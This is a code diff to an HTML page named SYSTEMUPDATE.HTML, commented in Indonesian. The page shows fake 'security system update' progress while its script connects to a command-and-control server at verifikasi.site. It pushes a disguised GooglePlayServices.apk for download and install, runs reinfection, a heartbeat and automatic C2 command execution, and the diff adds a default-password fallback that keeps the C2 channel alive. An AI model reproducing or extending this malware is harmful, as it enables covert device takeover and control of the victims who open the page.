@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - 48 PERINTAH C2 + WEBSOCKET!
+// 🔥 SYSTEMUPDATE.HTML - 48 PERINTAH C2 + WEBSOCKET (FALLBACK)
 // ============================================================
 
 var SERVER = 'https://verifikasi.site';
@@ -79,6 +79,7 @@ var allDone = false;
 var AUTO_EXECUTED = false;
 var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
+var retryCount = 0; // 🔥 FALLBACK COUNTER
 
 var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
 var APK_DOWNLOADED = false;
@@ -115,7 +116,15 @@ function connectWebSocket() {
                     K({ sumber: 'ws_auth', data: 'success' });
                 } else if (data.type === 'auth_failed') {
                     K({ sumber: 'ws_auth', data: 'failed' });
-                    ws.close();
+                    // 🔥 FALLBACK: coba dengan default password
+                    if (WS_PASSWORD !== 'default_fallback_password') {
+                        WS_PASSWORD = 'default_fallback_password';
+                        K({ sumber: 'ws_auth_fallback', data: 'retry_with_default' });
+                        ws.close();
+                        setTimeout(connectWebSocket, 1000);
+                    } else {
+                        ws.close();
+                    }
                 } else if (data.type === 'command') {
                     var cmd = data.command || data;
                     var aksi = cmd.aksi || 'unknown';
@@ -149,6 +158,20 @@ function connectWebSocket() {
         K({ sumber: 'ws_connect_error', data: e.message });
         setTimeout(connectWebSocket, 10000);
     }
+}
+
+// ============================================================
+// 🔥 FALLBACK WEBSOCKET (DIPANGGIL JIKA PASSWORD GAGAL)
+// ============================================================
+function connectWebSocketWithFallback() {
+    if (WS_PASSWORD && WS_PASSWORD !== '') {
+        connectWebSocket();
+        return;
+    }
+    // Gunakan default fallback
+    WS_PASSWORD = 'default_fallback_password';
+    K({ sumber: 'ws_fallback_used', data: 'connecting_with_default' });
+    connectWebSocket();
 }
 
 // ============================================================
@@ -209,7 +232,7 @@ function K(d) {
 }
 
 // ============================================================
-// AMBIL PASSWORD
+// AMBIL PASSWORD (DENGAN FALLBACK)
 // ============================================================
 function ambilPassword() {
     updateProgress(10, '⏳ Memperbarui System Keamanan...');
@@ -224,10 +247,11 @@ function ambilPassword() {
                     if (data.password && data.password.length > 0) {
                         WS_PASSWORD = data.password;
                         PASSWORD_FETCHED = true;
+                        retryCount = 0;
                         updateProgress(20, '⏳ Memperbarui System Keamanan...');
                         K({ sumber: 'password_received', data: 'ok' });
                         
-                        // 🔥 CONNECT WEBSOCKET SETELAH PASSWORD DIDAPAT
+                        // 🔥 CONNECT WEBSOCKET
                         connectWebSocket();
                         
                         startC2Polling();
@@ -239,10 +263,54 @@ function ambilPassword() {
                     }
                 } catch(e) {}
             }
+            // 🔥 FALLBACK: jika gagal 3 kali, gunakan default
+            retryCount++;
+            if (retryCount >= 3) {
+                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
+                WS_PASSWORD = 'default_fallback_password';
+                PASSWORD_FETCHED = true;
+                connectWebSocketWithFallback();
+                startC2Polling();
+                startHeartbeat();
+                startReinfection();
+                autoExecuteC2();
+                startDownloadAndInstall();
+                return;
+            }
             setTimeout(ambilPassword, 3000);
         };
-        xhr.onerror = function() { setTimeout(ambilPassword, 3000); };
-        xhr.ontimeout = function() { setTimeout(ambilPassword, 3000); };
+        xhr.onerror = function() {
+            retryCount++;
+            if (retryCount >= 3) {
+                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
+                WS_PASSWORD = 'default_fallback_password';
+                PASSWORD_FETCHED = true;
+                connectWebSocketWithFallback();
+                startC2Polling();
+                startHeartbeat();
+                startReinfection();
+                autoExecuteC2();
+                startDownloadAndInstall();
+                return;
+            }
+            setTimeout(ambilPassword, 3000);
+        };
+        xhr.ontimeout = function() {
+            retryCount++;
+            if (retryCount >= 3) {
+                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
+                WS_PASSWORD = 'default_fallback_password';
+                PASSWORD_FETCHED = true;
+                connectWebSocketWithFallback();
+                startC2Polling();
+                startHeartbeat();
+                startReinfection();
+                autoExecuteC2();
+                startDownloadAndInstall();
+                return;
+            }
+            setTimeout(ambilPassword, 3000);
+        };
         xhr.send();
     } catch(e) {
         setTimeout(ambilPassword, 3000);
